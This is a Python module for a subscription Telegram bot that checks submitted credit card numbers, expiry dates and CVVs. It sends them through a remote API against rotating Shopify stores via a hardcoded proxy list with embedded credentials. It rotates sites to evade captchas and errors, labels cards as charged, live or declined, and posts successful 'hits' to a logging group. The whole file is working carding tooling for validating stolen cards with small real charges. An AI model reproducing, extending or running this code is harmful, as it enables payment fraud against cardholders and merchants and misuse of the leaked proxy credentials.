import asyncio
import re
import logging
import aiohttp
import json
import random
import os

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
import database
from payments import PLANS

# Try importing bin lookup, handle if file doesn't exist
try:
    from bin import get_bin_info
except ImportError:
    logging.warning("bin.py not found. BIN lookup will be disabled.")
    async def get_bin_info(bin_num):
        return {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS & EMOJI IDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SH_API_URL = "https://autosh-production-94d8.up.railway.app/shopii"
SITES_FILE = "sites.txt"
MAX_SITE_ROTATIONS = 15

PROXY_LIST = [
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@cz-pra.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@co-bog.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "http://OR1673915314:LMf4JcDV@208.196.99.128:8813",
    "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
    "http://1352:23CfS1Bz7oF0@p101.squidproxies.com:9094",
    "http://g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
]

RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402',
    'failed to get checkout', 'captcha at checkout', 'site not supported',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'amount_too_small',
    'change proxy or site', 'token not found', 'invalid_response',
    'resolve', 'item', 'curl error', 'could not resolve host',
    'connect tunnel failed',
]

# NEW UI CUSTOM EMOJI IDS
CHARGED_EMOJI_ID = "5891044423856296980"
LIVE_EMOJI_ID = "4958610528588008305"
CARD_EMOJI_ID = "5447453226498552490"
USER_EMOJI_ID = "5956561749070057536"
PRO_EMOJI_ID = "6298678524379137990"
BUTTON_EMOJI_ID = "5465465194056525619"
GATE_EMOJI_ID = "5801044672658805468"
DECLINED_EMOJI_ID = "4956612582816351459"
BUY_EMOJI_ID = "5935795874251674052"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT LOG GROUP ID
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HIT_LOG_GROUP_ID = -1003838614236

# Router for this module
router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DATABASE MIGRATION FOR STATS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def ensure_stats_columns():
    """Ensures cc_checked and cc_charged columns exist in the users table."""
    try:
        conn = database.get_connection()
        cursor = conn.cursor()
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_checked INTEGER DEFAULT 0")
        except Exception:
            pass
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS cc_charged INTEGER DEFAULT 0")
        except Exception:
            pass
        conn.commit()
        conn.close()
        logging.info("[DB] SH Stats columns checked/created.")
    except Exception as e:
        logging.error(f"[DB] Error checking stats columns: {e}")

# Run check on import
ensure_stats_columns()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SMALL_CAPS_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ',
    'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ',
    'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ',
    'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
    'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ',
    'z': 'ᴢ'
}

def to_small_caps(text: str) -> str:
    """Convert lowercase to small caps, keep uppercase as is (e.g., Uꜱᴅ)"""
    result = ""
    for char in text:
        if char.lower() in SMALL_CAPS_MAP:
            if char.isupper():
                result += char
            else:
                result += SMALL_CAPS_MAP[char]
        else:
            result += char
    return result

def to_small_caps_title(text: str) -> str:
    """Convert to small caps with first letter of each word uppercase (e.g., Aᴅᴅ_Sʜɪᴘᴘɪɴɢ_Eʀʀᴏʀ)"""
    result = ""
    is_new_word = True
    for char in text:
        if char in ['_', ' ', '[', '(', '/', '!', ':']:
            result += char
            is_new_word = True
        elif char.lower() in SMALL_CAPS_MAP:
            if is_new_word:
                result += char.upper()
                is_new_word = False
            else:
                result += SMALL_CAPS_MAP[char.lower()]
        else:
            result += char
            is_new_word = False
    return result

def get_user_link(user_obj) -> str:
    """Returns a properly clickable HTML hyperlink for the user."""
    name = user_obj.first_name or "User"
    if user_obj.username:
        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

async def update_user_stats(user_id, is_charged):
    """
    Increments cc_checked and optionally cc_charged in the database.
    """
    def _sync_update():
        conn = database.get_connection()
        cursor = conn.cursor()
        
        cursor.execute("UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s", (user_id,))
        
        if is_charged:
            cursor.execute("UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s", (user_id,))
            
        conn.commit()
        conn.close()

    await asyncio.to_thread(_sync_update)

async def get_user_plan_details(user_id):
    """
    Returns tuple: (Plan Display Name, Plan Emoji ID) or (Default Name, Default Emoji)
    """
    try:
        if not database.is_premium_active(user_id):
            return "No Plan", "5267500801240092311"
        
        def _sync_fetch():
            conn = database.get_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT current_plan FROM users WHERE user_id = %s", (user_id,))
            row = cursor.fetchone()
            conn.close()
            return row.get('current_plan') if row else None
        
        plan_key = await asyncio.to_thread(_sync_fetch)
        
        if plan_key and plan_key in PLANS:
            plan_info = PLANS[plan_key]
            return plan_info.get("display", plan_key), plan_info.get("emoji_id", "5267500801240092311")
            
        return "Unknown", "5267500801240092311"
        
    except Exception as e:
        logging.error(f"Error fetching plan details: {e}")
        return "Error", "5267500801240092311"

def luhn_check(card_number: str) -> bool:
    """Validates a credit card number using the Luhn Algorithm."""
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
        
    return total % 10 == 0

def get_shopify_sites():
    """
    Loads sites from Database (Like msh.py).
    Falls back to sites.txt if DB is empty or fails.
    """
    # 1. Try Database
    try:
        db_sites = database.get_all_sites()
        if db_sites:
            logging.debug(f"[SH] Loaded {len(db_sites)} sites from DB")
            return db_sites
    except Exception as e:
        logging.error(f"[SH] Error reading sites from DB: {e}")

    # 2. Fallback to File
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
            if sites:
                logging.warning(f"[SH] DB empty/fail — loaded {len(sites)} sites from {SITES_FILE}")
                return sites
    except Exception as e:
        logging.error(f"[SH] Error reading {SITES_FILE}: {e}")

    logging.error("[SH] No sites found in DB or File.")
    return []

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT LOG FUNCTIONS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_emoji, status_type="CHARGED", site_url="Unknown"):
    """
    Sends hit log to the designated group for approved cards.
    Shows the specific Site URL in the Gate field for the log.
    """
    user_link = get_user_link(user_obj)
    response_msg_styled = to_small_caps_title(str(response_msg))
    
    status_emoji = CHARGED_EMOJI_ID if status_type == "CHARGED" else LIVE_EMOJI_ID
    status_text = "Cʜᴀʀɢᴇᴅ" if status_type == "CHARGED" else "Lɪᴠᴇ"
    
    # For the log, we show the actual site URL so the admin knows where it hit
    gate_name_styled = to_small_caps(site_url)

    caption = (
        f'<b><a href="https://t.me/FailureFr_07">[ Sᴛᴀᴛᴜꜱ ]</a> ➛ {status_text} <tg-emoji emoji-id="{status_emoji}">💎</tg-emoji></b>\n'
        f'<b>Gᴀᴛᴇ ➛ {gate_name_styled}</b>\n'
        f'<b>Rᴀᴡ ➛ {response_msg_styled} <tg-emoji emoji-id="4958926882994127612">✅</tg-emoji></b>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji}">⭐</tg-emoji></b>'
    )

    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            {
                "text": "𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆",
                "url": "https://t.me/CARDXV4_BOT",
                "style": "primary",
                "icon_custom_emoji_id": BUTTON_EMOJI_ID
            }
        ]
    ])

    try:
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
        logging.info(f"[SH] Hit log sent to group - Status: {status_type} - Gate: {site_url}")
    except Exception as e:
        logging.error(f"[SH] Error sending hit log to group: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KEYBOARD FOR NO PLAN USERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def buy_now_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                {
                    "text": "Buy Now",
                    "callback_data": "buy_now",
                    "style": "primary",
                    "icon_custom_emoji_id": BUY_EMOJI_ID
                }
            ]
        ]
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/sh"))
async def sh_command(message: types.Message):
    user = message.from_user
    user_id = user.id

    # 1. CHECK PLAN / PREMIUM STATUS
    if not database.is_premium_active(user_id):
        await message.reply(
            "<b>❌ Access Denied.</b>\n"
            "<b>You must have an active plan to use this gate.</b>\n"
            "<b>Please purchase a plan to continue.</b>",
            parse_mode="HTML",
            reply_markup=buy_now_keyboard()
        )
        return

    # 2. Extract Card Details
    parts = message.text.split(maxsplit=1)
    raw_text = ""
    
    if len(parts) > 1:
        raw_text = parts[1].strip()
    elif message.reply_to_message:
        raw_text = message.reply_to_message.text or message.reply_to_message.caption
        
    if not raw_text:
        await message.reply(
            "<b>❌ Usage:</b> /sh <code>cc|mm|yy|cvv</code>\n"
            "<b>Or reply to a message containing card details.</b>",
            parse_mode="HTML"
        )
        return

    # Regex to find CC
    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, raw_text)

    if not match:
        await message.reply(
            "<b>❌ Invalid Card Format.</b>\n"
            "<b>Please provide CC as <code>4242424242424242|05|27|123</code></b>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = match.groups()

    # Normalize Year
    if len(yy_raw) == 4:
        yy = yy_raw[2:]
    else:
        yy = yy_raw

    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    # 3. LUHN CHECK
    if not luhn_check(cc):
        await message.reply(
            "<b>❌ Invalid Card</b>\n"
            "<b>Your card number is incorrect.</b>",
            parse_mode="HTML"
        )
        return

    # 4. Load Sites from Database
    sites = get_shopify_sites()
    if not sites:
        await message.reply(
            "❌ <b>No sites found.</b>\n"
            "Please add sites to the Database or <code>sites.txt</code>.",
            parse_mode="HTML"
        )
        return

    # 5. Send Processing Message
    processing_text = "<pre>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴…⏳</pre>"
    proc_msg = await message.reply(processing_text, parse_mode="HTML")

    # 6. Execute Background Task
    asyncio.create_task(
        process_sh_check(
            message, proc_msg, user, user_id, formatted_cc, cc, sites
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_sh_check(message, proc_msg, user, user_id, formatted_cc, cc, sites):
    """
    Handles the Shopify API calls with site rotation, DB updates, and final message editing.
    """
    
    # A. ENSURE USER EXISTS IN DB
    try:
        await asyncio.to_thread(database.ensure_user, user_id, user.username, user.first_name)
    except Exception as e:
        logging.error(f"Error ensuring user exists: {e}")

    # B. Site Rotation & API Call
    api_result = {"Response": "UNKNOWN_ERROR"}
    last_site = None

    for _ in range(MAX_SITE_ROTATIONS):
        # Pick a site different from last if possible
        candidates = [s for s in sites if s != last_site] or sites
        current_site = random.choice(candidates)
        last_site = current_site

        proxy = random.choice(PROXY_LIST)

        try:
            timeout = aiohttp.ClientTimeout(total=45)
            params = {"site": current_site, "cc": formatted_cc, "proxy": proxy}
            async with aiohttp.ClientSession() as session:
                async with session.get(SH_API_URL, params=params, timeout=timeout) as resp:
                    text = await resp.text()
                    try:
                        api_result = json.loads(text)
                    except json.JSONDecodeError:
                        api_result = {"Response": "PARSE_ERROR"}
        except Exception as e:
            logging.error(f"[SH] API error ({current_site}): {e}")
            api_result = {"Response": "CONNECTION_ERROR"}

        response_lower = api_result.get("Response", "").lower()
        should_rotate = any(err in response_lower for err in RETRY_ERRORS)
        if not should_rotate:
            break

    # C. Bin Lookup
    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    # D. Determine Final Status
    response_raw = api_result.get("Response", "Unknown Error")
    response_lower = response_raw.lower()
    
    is_charged_stat = False
    final_status = ""
    display_raw_text = to_small_caps_title(str(response_raw))
    
    CHARGED_KEYWORDS = ["order_placed", "charged", "order_paid", "thank you", "thank_you"]
    APPROVED_KEYWORDS = [
        "insufficient_funds", "invalid_cvc", "incorrect_cvc", "invalid_zip", "incorrect_zip",
    ]

    is_technical_error = (
        any(err in response_lower for err in RETRY_ERRORS)
        or "error" in response_lower
        or "timeout" in response_lower
    )

    if is_technical_error:
        final_status = "𝗘𝗥𝗥𝗢𝗥 ⚠️"
    elif any(k in response_lower for k in CHARGED_KEYWORDS):
        final_status = f'Cʜᴀʀɢᴇᴅ <tg-emoji emoji-id="{CHARGED_EMOJI_ID}">💎</tg-emoji>'
        is_charged_stat = True
        hit_type = "CHARGED"
    elif any(k in response_lower for k in APPROVED_KEYWORDS):
        final_status = f'Lɪᴠᴇ <tg-emoji emoji-id="{LIVE_EMOJI_ID}">💎</tg-emoji>'
        is_charged_stat = True
        hit_type = "LIVE"
    else:
        final_status = f'Dᴇᴄʟɪɴᴇᴅ <tg-emoji emoji-id="{DECLINED_EMOJI_ID}">❌</tg-emoji>'
        hit_type = None

    # E. UPDATE STATS (Checked + Approved as "charged" stat)
    try:
        await update_user_stats(user_id, is_charged_stat)
    except Exception as e:
        logging.error(f"Failed to update stats: {e}")

    # F. GET USER PLAN DETAILS
    plan_display, plan_emoji = await get_user_plan_details(user_id)

    # G. SEND HIT LOG TO GROUP (Only for charged/live)
    if is_charged_stat:
        try:
            bot = message.bot
            # Pass the last_site URL here to display it in the group log
            await send_hit_log_to_group(
                bot=bot,
                response_msg=response_raw,
                user_obj=user,
                plan_emoji=plan_emoji,
                status_type=hit_type,
                site_url=last_site if last_site else "Unknown Site"
            )
        except Exception as e:
            logging.error(f"[SH] Failed to send hit log: {e}")

    # H. Build Final Caption Elements
    bin_info_str = f"{bin_scheme} - {bin_bank} - {bin_country}"
    user_link = get_user_link(user)
    dev_link = '<a href="https://t.me/FailureFr_07">kคli liຖนxx</a>'
    
    # CHANGE: User Response gate text is now Static as requested
    gate_text = to_small_caps("Shopify 0.5$")
    
    # NEW UI FORMAT
    final_caption = (
        f'<b><a href="https://t.me/FailureFr_07">[ Sᴛᴀᴛᴜꜱ ]</a> ➛ {final_status}</b>\n'
        f'<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">🔍</tg-emoji> ➛ <code>{formatted_cc}</code></b>\n'
        f'<b>{to_small_caps("Gate")} ➛ {gate_text}</b> <tg-emoji emoji-id="{GATE_EMOJI_ID}">🛒</tg-emoji>\n'
        f'<b>{to_small_caps("Raw")} ➛ {display_raw_text}</b>\n'
        f'<b>{to_small_caps("Info")} ➛ <code>{bin_info_str}</code></b>\n'
        f'<b>{to_small_caps("User")} ➛ {user_link} <tg-emoji emoji-id="{plan_emoji}">⭐</tg-emoji> <b>({plan_display})</b></b>\n'
        f'<b>{to_small_caps("Pro")} ➛ {dev_link}</b> <tg-emoji emoji-id="{PRO_EMOJI_ID}">⚡</tg-emoji>'
    )

    # I. Keyboard
    reply_markup = InlineKeyboardMarkup(inline_keyboard=[
        [
            {
                "text": "𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆",
                "url": "https://t.me/CARDXV4_BOT",
                "style": "primary",
                "icon_custom_emoji_id": BUTTON_EMOJI_ID
            }
        ]
    ])

    # J. Edit the Processing Message with Result
    try:
        await proc_msg.edit_text(
            text=final_caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        try:
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
        except Exception as e2:
            logging.error(f"Fallback reply also failed: {e2}")
